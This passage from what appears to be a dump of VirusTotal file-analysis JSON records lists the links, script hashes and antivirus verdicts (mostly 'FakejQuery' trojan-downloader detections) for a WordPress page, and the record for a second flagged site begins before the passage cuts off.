          "http://jadroobpo.com/new-trends-in-responsive-design/",
          "http://jadroobpo.com/new-trends-in-responsive-design/#comments",
          "http://jadroobpo.com/designing-the-new-app-of-the-future/",
          "http://jadroobpo.com/designing-the-new-app-of-the-future/#comments",
          "http://jadroobpo.com/managing-home-office-culture/#comments",
          "http://jadroobpo.com/managing-home-office-culture/",
          "http://jadroobpo.com/trends-in-responsive-design/",
          "http://jadroobpo.com/trends-in-responsive-design/#comments",
          "http://jadroobpo.com/tech-conference-2015/#comments",
          "http://jadroobpo.com/tech-conference-2015/",
          "http://jadroobpo.com/managing-office-culture/#comments",
          "http://jadroobpo.com/managing-office-culture/",
          "http://jadroobpo.com/designing-the-app-of-the-future/",
          "http://jadroobpo.com/designing-the-app-of-the-future/#comments",
          "http://jadroobpo.com/category/conference/",
          "http://jadroobpo.com/tech-conference-2017/#respond",
          "http://jadroobpo.com/tech-conference-2017/",
          "http://jadroobpo.com/managing-office-culture-2/#respond",
          "http://jadroobpo.com/managing-office-culture-2/",
          "http://jadrooit.com",
          "https://www.facebook.com/Jadroo-IT-1714692548747069/?fref=ts",
          "https://twitter.com/jadrooit",
          "https://vine.co/",
          "https://www.linkedin.com/company/jadroo-it-ltd?report%2Esuccess=KJ_KkFGTDCfMt-A7wV3Fn9Yvgwr02Kd6AZHGx4bQCDiP6-2rfP2oxyVoEQiPrcAQ7Bf",
          "https://plus.google.com/u/0/112086702487215211624/about",
          "http://jadroobpo.com/news-app-deliveres-fresh-ideas/",
          "http://jadroobpo.com/interview-with-ceo-of-big-startup/",
          "http://jadroobpo.com/apps-update-reaches-more-customers/"
        ],
        "scripts": [
          {
            "attributes": {
              "type": "application/javascript"
            },
            "sha256": "21a630e7ccb8611a367c6ab266cbf821a428b18a80ef989a2518d2d62bebb314"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "69e3ce1550fe23335940439b5f3b1479456978f5fcb07a648332000123f1546a"
          },
          {
            "attributes": {
              "src": "http://jadroobpo.com/wp-includes/js/jquery/jquery.js?ver=1.12.4",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://jadroobpo.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://jadroobpo.com/wp-content/plugins/jquery-vertical-accordion-menu/js/jquery.hoverIntent.minified.js?ver=4.5.23",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://jadroobpo.com/wp-content/plugins/jquery-vertical-accordion-menu/js/jquery.cookie.js?ver=4.5.23",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://jadroobpo.com/wp-content/plugins/jquery-vertical-accordion-menu/js/jquery.dcjqaccordion.2.9.js?ver=4.5.23",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://jadroobpo.com/wp-content/plugins/LayerSlider/static/js/greensock.js?ver=1.11.8",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "dc5c7facd3b0384a8d1d6333dd06d1cf3b61aadaf4f1c72cfd623b9461fdcf65"
          },
          {
            "attributes": {
              "src": "http://jadroobpo.com/wp-content/plugins/LayerSlider/static/js/layerslider.kreaturamedia.jquery.js?ver=5.6.6",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://jadroobpo.com/wp-content/plugins/LayerSlider/static/js/layerslider.transitions.js?ver=5.6.6",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "9ca0e1f90925749bfac361f452ce0a1a579fe1dfc85595bbbcce45f73afad0e9"
          },
          {
            "attributes": {
              "src": "//jadroobpo.com/wp-content/plugins/woocommerce/assets/js/frontend/add-to-cart.min.js?ver=2.6.2",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://jadroobpo.com/wp-content/plugins/js_composer/assets/js/vendors/woocommerce-add-to-cart.js?ver=4.11.2.1",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "9647dd13dfae83c1716236daad0c35698a82b6d2140e3b2c7f9cc309ab04db27"
          },
          {
            "attributes": {
              "src": "http://jadroobpo.com/wp-content/plugins/contact-form-7/includes/js/jquery.form.min.js?ver=3.51.0-2014.06.20",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "d44f5122a79eb3240380e35e332273602f31334e8fe2cd6bba7009214f5abe92"
          },
          {
            "attributes": {
              "src": "http://jadroobpo.com/wp-content/plugins/contact-form-7/includes/js/scripts.js?ver=4.4.2",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "//jadroobpo.com/wp-content/plugins/woocommerce/assets/js/jquery-blockui/jquery.blockUI.min.js?ver=2.70",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "49fef63c90c980d255e4ceef30d0858044381b80c50f65e849f07326b8912f41"
          },
          {
            "attributes": {
              "src": "//jadroobpo.com/wp-content/plugins/woocommerce/assets/js/frontend/woocommerce.min.js?ver=2.6.2",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "//jadroobpo.com/wp-content/plugins/woocommerce/assets/js/jquery-cookie/jquery.cookie.min.js?ver=1.4.1",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "8548e1704cb61362adf93a9bd4ec6e566f773291c27b97e1345b93fda56381fb"
          },
          {
            "attributes": {
              "src": "//jadroobpo.com/wp-content/plugins/woocommerce/assets/js/frontend/cart-fragments.min.js?ver=2.6.2",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://jadroobpo.com/wp-includes/js/jquery/ui/core.min.js?ver=1.11.4",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://jadroobpo.com/wp-includes/js/jquery/ui/widget.min.js?ver=1.11.4",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://jadroobpo.com/wp-includes/js/jquery/ui/tabs.min.js?ver=1.11.4",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://jadroobpo.com/wp-includes/js/jquery/ui/accordion.min.js?ver=1.11.4",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "d233aa8d6d74780de565fdcaae83156103f683fe12dd63355b288a58f58840fe"
          },
          {
            "attributes": {
              "src": "http://jadroobpo.com/wp-includes/js/mediaelement/mediaelement-and-player.min.js?ver=2.18.1-a",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://jadroobpo.com/wp-includes/js/mediaelement/wp-mediaelement.min.js?ver=4.5.23",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://jadroobpo.com/wp-includes/js/jquery/ui/mouse.min.js?ver=1.11.4",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://jadroobpo.com/wp-includes/js/jquery/ui/slider.min.js?ver=1.11.4",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://jadroobpo.com/wp-content/themes/startit/assets/js/third-party.min.js?ver=4.5.23",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://jadroobpo.com/wp-content/plugins/js_composer/assets/lib/bower/isotope/dist/isotope.pkgd.min.js?ver=4.11.2.1",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "//maps.googleapis.com/maps/api/js?ver=4.5.23",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "f5942026e454bf0d9e8e33029b1a65d2a4b28a927e97f819e503513c92ad0171"
          },
          {
            "attributes": {
              "src": "http://jadroobpo.com/wp-content/themes/startit/assets/js/modules.min.js?ver=4.5.23",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://jadroobpo.com/wp-content/themes/startit/assets/js/blog.min.js?ver=4.5.23",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://jadroobpo.com/wp-content/plugins/js_composer/assets/js/dist/js_composer_front.min.js?ver=4.11.2.1",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://jadroobpo.com/wp-content/themes/startit/assets/js/like.min.js?ver=1.0",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://jadroobpo.com/wp-includes/js/wp-embed.min.js?ver=4.5.23",
              "type": "text/javascript"
            }
          }
        ],
        "html_meta": {
          "viewport": [
            "width=device-width,initial-scale=1,user-scalable=no"
          ],
          "robots": [
            "noindex,follow"
          ],
          "generator": [
            "WordPress 4.5.23",
            "WooCommerce 2.6.2",
            "Powered by Visual Composer - drag and drop page builder for WordPress."
          ]
        }
      },
      "last_submission_date": 1691055348,
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": "Trojan.HTML.FakejQuery.4!c",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Elastic": {
          "category": "type-unsupported",
          "engine_name": "Elastic",
          "engine_version": "4.0.103",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230801"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "1.1.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "FireEye": {
          "category": "malicious",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": "JS:Trojan.Agent.FNZI",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "CAT-QuickHeal": {
          "category": "malicious",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": "JS.FakejQuery.C",
          "method": "blacklist",
          "engine_update": "20230802"
        },
        "ALYac": {
          "category": "malicious",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "result": "JS:Trojan.Agent.FNZI",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": "JS:Trojan.Agent.FNZI",
          "method": "blacklist",
          "engine_update": "20230802"
        },
        "Paloalto": {
          "category": "type-unsupported",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Sangfor": {
          "category": "malicious",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": "Exploit.Generic-Script.Save.ma19",
          "method": "blacklist",
          "engine_update": "20230724"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.105.49162",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Alibaba": {
          "category": "type-unsupported",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "undetected",
          "engine_name": "K7GW",
          "engine_version": "12.105.49162",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230801"
        },
        "VirIT": {
          "category": "undetected",
          "engine_name": "VirIT",
          "engine_version": "9.5.505",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230802"
        },
        "Cyren": {
          "category": "malicious",
          "engine_name": "Cyren",
          "engine_version": "6.5.1.2",
          "result": "JS/FakejQuery.B!Eldorado",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230119"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.20.0.0",
          "result": "ISB.Downloader!gen391",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "tehtris": {
          "category": "type-unsupported",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "27677",
          "result": "JS/TrojanDownloader.FakejQuery.D",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "APEX": {
          "category": "type-unsupported",
          "engine_name": "APEX",
          "engine_version": "6.439",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230801"
        },
        "TrendMicro-HouseCall": {
          "category": "undetected",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "23.8.8378.0",
          "result": "JS:Agent-EAO [Trj]",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Cynet": {
          "category": "malicious",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.27",
          "result": "Malicious (score: 99)",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Kaspersky": {
          "category": "undetected",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "JS:Trojan.Agent.FNZI",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "NANO-Antivirus": {
          "category": "malicious",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": "Trojan.Script.Redirector.eiyypi",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "JS:Trojan.Agent.FNZI",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": "Trojan.FakejQuery/JS!1.A136 (CLASSIC)",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "2.3.1.0",
          "result": "Troj/JSRedir-RX",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Baidu": {
          "category": "malicious",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": "JS.Trojan-Downloader.FakejQuery.h",
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "F-Secure": {
          "category": "malicious",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1137.128",
          "result": "Malware.JS/FakejQuery.G",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "DrWeb": {
          "category": "malicious",
          "engine_name": "DrWeb",
          "engine_version": "7.0.60.6220",
          "result": "JS.Redirector.304",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Zillya": {
          "category": "malicious",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.4929",
          "result": "Downloader.FakejQuery.JS.1",
          "method": "blacklist",
          "engine_update": "20230802"
        },
        "TrendMicro": {
          "category": "undetected",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "McAfee-GW-Edition": {
          "category": "malicious",
          "engine_name": "McAfee-GW-Edition",
          "engine_version": "v2021.2.0+4045",
          "result": "BehavesLike.HTML.ExpKitGen2.kq",
          "method": "blacklist",
          "engine_update": "20230802"
        },
        "SentinelOne": {
          "category": "type-unsupported",
          "engine_name": "SentinelOne",
          "engine_version": "23.3.0.3",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230705"
        },
        "Trapmine": {
          "category": "type-unsupported",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.90",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230718"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230619"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": "JS:Trojan.Agent.FNZI (B)",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "6.1.14.0",
          "result": "Trojan-Downloader.JS.Fakejquery",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "230803-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230802"
        },
        "Webroot": {
          "category": "type-unsupported",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Avira": {
          "category": "malicious",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": "JS/FakejQuery.G",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Antiy-AVL": {
          "category": "malicious",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": "Trojan[Downloader]/JS.FakejQuery.b",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23060.1005",
          "result": "TrojanDownloader:JS/FakejQuery.A!bit",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.131.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Xcitium": {
          "category": "malicious",
          "engine_name": "Xcitium",
          "engine_version": "35880",
          "result": "TrojWare.JS.FakejQuery.B@75aotp",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": "JS:Trojan.Agent.FNZI",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230727"
        },
        "ZoneAlarm": {
          "category": "undetected",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.36309B:27.32645",
          "result": "Script.Trojan-Downloader.FakejQuery.D",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1691053266",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230801"
        },
        "AhnLab-V3": {
          "category": "malicious",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.24.0.10447",
          "result": "Trojan/HTML.Redirect.S1202",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.119",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230727"
        },
        "McAfee": {
          "category": "undetected",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2023-08-03.01",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "DeepInstinct": {
          "category": "type-unsupported",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Cylance": {
          "category": "type-unsupported",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230726"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Tencent": {
          "category": "malicious",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": "Trojan-DL.Html.Fakejquery.504788",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "MAX": {
          "category": "malicious",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": "malware (ai score=83)",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "MaxSecure": {
          "category": "undetected",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": "JS/FakeJquery.G!tr",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "23.8.8378.0",
          "result": "JS:Agent-EAO [Trj]",
          "method": "blacklist",
          "engine_update": "20230803"
        },
        "Cybereason": {
          "category": "type-unsupported",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20210330"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230802"
        },
        "CrowdStrike": {
          "category": "type-unsupported",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20220812"
        }
      },
      "trid": [
        {
          "file_type": "HyperText Markup Language",
          "probability": 100
        }
      ],
      "sha256": "9b754d5703ee24903318f082c0e8955e64fd1ddb9b2a2bd00f2b45c55d7385ba",
      "type_extension": "html",
      "tags": [
        "html",
        "contains-embedded-js"
      ],
      "last_analysis_date": 1691055348,
      "unique_sources": 2,
      "first_submission_date": 1616033015,
      "ssdeep": "1536:r0qb6mjYIX2VE1C99AA66AA9euvuou5uluYugum/uPuwuTudu4uAumiHAdi1gh4F:rb6mjYIX2VmCSo2Pbcu6v0VagWA8WtZE",
      "md5": "7a4b2e9620858390fda66f3ccd73f69f",
      "sha1": "478508d377e4771c2f69232082d58a360840a5c7",
      "magic": "HTML document, ASCII text, with very long lines (9831u), with CRLF, LF line terminators",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 16,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 35,
        "undetected": 24
      },
      "meaningful_name": "digital",
      "reputation": 0
    },
    "type": "file",
    "id": "9b754d5703ee24903318f082c0e8955e64fd1ddb9b2a2bd00f2b45c55d7385ba",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/9b754d5703ee24903318f082c0e8955e64fd1ddb9b2a2bd00f2b45c55d7385ba"
    }
  }
},
{
  "_id": {
    "$oid": "65b4fdd425047c7018f82ac7"
  },
  "data": {
    "attributes": {
      "type_description": "HTML",
      "tlsh": "T160033177AAC4EA4B23A199C82222F73D5443219FCD521BC270EF6DE57E51F80CB1499E",
      "vhash": "htm:82ee5b6bed2242003964b932583439d3",
      "type_tags": [
        "internet",
        "html"
      ],
      "names": [],
      "last_modification_date": 1706332175,
      "type_tag": "html",
      "times_submitted": 1,
      "total_votes": {
        "harmless": 0,
        "malicious": 1
      },
      "size": 40930,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.cryxos/redir",
        "popular_threat_category": [
          {
            "count": 22,
            "value": "trojan"
          }
        ],
        "popular_threat_name": [
          {
            "count": 7,
            "value": "cryxos"
          },
          {
            "count": 5,
            "value": "redir"
          },
          {
            "count": 2,
            "value": "gen2"
          }
        ]
      },
      "html_info": {
        "title": "Satiricon.be",
        "trackers": {
          "Facebook Connect": [
            {
              "url": "//connect.facebook.net/fr_FR/all.js"
            }
          ]
        },
        "hrefs": [
          "https://www.satiricon.be/wp-content/themes/1283244220_dooffy_design_icons_EU_flags_Belgium.png",
          "http://www.satiricon.be/?feed=rss2",
          "https://www.satiricon.be/wp-content/themes/revolt_basic/style.css",
          "http://www.satiricon.be/xmlrpc.php",
          "//s.w.org",
          "http://www.satiricon.be/wp-includes/css/dist/block-library/style.min.css?ver=5.7.2",
          "https://www.satiricon.be/index.php?rest_route=/",
          "https://www.satiricon.be/xmlrpc.php?rsd",
          "http://www.satiricon.be/wp-includes/wlwmanifest.xml",
          "https://www.satiricon.be",
          "javascript:location.href=('mailto:postmaster'+'@'+'satiricon'+'.be')",
          "https://www.satiricon.be/?p=20943",
          "https://www.satiricon.be/?cat=22",
          "https://www.satiricon.be/?cat=27",
          "https://www.satiricon.be/?p=20940",
          "https://www.satiricon.be/?cat=35",
          "https://www.satiricon.be/?p=20937",
          "https://www.satiricon.be/?cat=73",
          "https://www.satiricon.be/?p=20934",
          "https://www.satiricon.be/?p=20929",
          "https://www.satiricon.be/?cat=77",
          "https://www.satiricon.be/?cat=11",
          "https://www.satiricon.be/?cat=53",
          "https://www.satiricon.be/?p=20926",
          "https://www.satiricon.be/?p=20923",
          "https://www.satiricon.be/?p=20920",
          "https://www.satiricon.be/?cat=51",
          "https://www.satiricon.be/?p=20917",
          "https://www.satiricon.be/?cat=79",
          "https://www.satiricon.be/?cat=78",
          "https://www.satiricon.be/wp-content/uploads/2019/08/Autodaf%C3%83%C2%A9-turc-208x300.jpg/?paged=2",
          "https://www.satiricon.be/wp-content/uploads/2019/08/Autodaf%C3%83%C2%A9-turc-208x300.jpg/?paged=3",
          "https://www.satiricon.be/wp-content/uploads/2019/08/Autodaf%C3%83%C2%A9-turc-208x300.jpg/?paged=545",
          "https://www.satiricon.be/?cat=12",
          "https://www.satiricon.be/?cat=72",
          "https://www.satiricon.be/?cat=58",
          "https://www.satiricon.be/?cat=74",
          "https://www.satiricon.be/?cat=75",
          "https://www.satiricon.be/?cat=1",
          "https://www.satiricon.be/?cat=4",
          "https://www.satiricon.be/?cat=19",
          "https://www.satiricon.be/?cat=17",
          "https://www.satiricon.be/?cat=18",
          "https://www.satiricon.be/?cat=8",
          "https://www.satiricon.be/?cat=34",
          "https://www.satiricon.be/?cat=32",
          "https://www.satiricon.be/?cat=37",
          "https://www.satiricon.be/?cat=36",
          "https://www.satiricon.be/?cat=38",
          "https://www.satiricon.be/?cat=39",
          "https://www.satiricon.be/?cat=33",
          "https://www.satiricon.be/?cat=6",
          "https://www.satiricon.be/?cat=26",
          "https://www.satiricon.be/?cat=24",
          "https://www.satiricon.be/?cat=25",
          "https://www.satiricon.be/?cat=23",
          "https://www.satiricon.be/?cat=14",
          "https://www.satiricon.be/?cat=64",
          "https://www.satiricon.be/?cat=63",
          "https://www.satiricon.be/?cat=7",
          "https://www.satiricon.be/?cat=29",
          "https://www.satiricon.be/?cat=28",
          "https://www.satiricon.be/?cat=30",
          "https://www.satiricon.be/?cat=31",
          "https://www.satiricon.be/?cat=9",
          "https://www.satiricon.be/?cat=41",
          "https://www.satiricon.be/?cat=42",
          "https://www.satiricon.be/?cat=40",
          "https://www.satiricon.be/?cat=54",
          "https://www.satiricon.be/?cat=49",
          "https://www.satiricon.be/?cat=57",
          "https://www.satiricon.be/?cat=55",
          "https://www.satiricon.be/?cat=52",
          "https://www.satiricon.be/?cat=56",
          "https://www.satiricon.be/?cat=65",
          "https://www.satiricon.be/?cat=50",
          "https://www.satiricon.be/?cat=5",
          "https://www.satiricon.be/?cat=20",
          "https://www.satiricon.be/?cat=21",
          "https://www.satiricon.be/?cat=80",
          "https://www.satiricon.be/?cat=3",
          "https://www.satiricon.be/?cat=15",
          "https://www.satiricon.be/?cat=71",
          "https://www.satiricon.be/?cat=16",
          "https://www.satiricon.be/?cat=10",
          "https://www.satiricon.be/?cat=45",
          "https://www.satiricon.be/?cat=43",
          "https://www.satiricon.be/?cat=69",
          "https://www.satiricon.be/?cat=76",
          "https://www.satiricon.be/?cat=46",
          "https://www.satiricon.be/?cat=48",
          "https://www.satiricon.be/?cat=70",
          "https://www.satiricon.be/?cat=47",
          "https://www.satiricon.be/?cat=44",
          "https://www.satiricon.be/?m=202107",
          "https://www.satiricon.be/?m=202106",
          "https://www.satiricon.be/?m=202105",
          "https://www.satiricon.be/?m=202104",
          "https://www.satiricon.be/?m=202103",
          "https://www.satiricon.be/?m=202102"
        ],
        "scripts": [
          {
